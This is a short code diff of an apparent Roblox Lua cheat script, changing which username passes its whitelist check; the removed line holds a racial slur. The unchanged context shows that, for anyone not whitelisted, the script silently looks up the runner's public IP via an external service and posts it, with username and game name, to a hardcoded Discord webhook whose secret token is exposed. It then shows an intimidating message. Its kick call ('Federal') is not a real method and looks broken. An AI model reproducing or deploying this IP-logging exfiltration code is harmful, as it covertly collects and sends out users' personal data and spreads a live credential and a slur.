@@ -1,6 +1,6 @@
 local webh = "https://discord.com/api/webhooks/1158584597735559249/cIi4887D_b9R5JffzsZ-nge6jcJfcfHWJts80m2-u_mp_QeMvWGY6GnW4ICcSOZvR13O"
 
-if game.Players.LocalPlayer.Name == "niggamanpoopyball" then
+if game.Players.LocalPlayer.Name == "exeeollda6" then
 print("script")
 else
 game.Players.LocalPlayer:Federal("You arent Whitelisted. Your Address, Username, and Game Name was sent to administration.")
@@ -9,7 +9,7 @@ pcall(function()
    local data = {
        ["embeds"] = {
            {
-               ["title"] = "This Script was whitelisted to niggamanpoopyball but **__" .. game.Players.LocalPlayer.Name.."__ Executed It in ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."!**",
+               ["title"] = "This Script was whitelisted to exeeollda6 but **__" .. game.Players.LocalPlayer.Name.."__ Executed It in ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."!**",
                ["description"] = "**Not Whitelisted users IP: ** __**" .. game:HttpGet("https://api.ipify.org") .. "**__" 
            }
        }
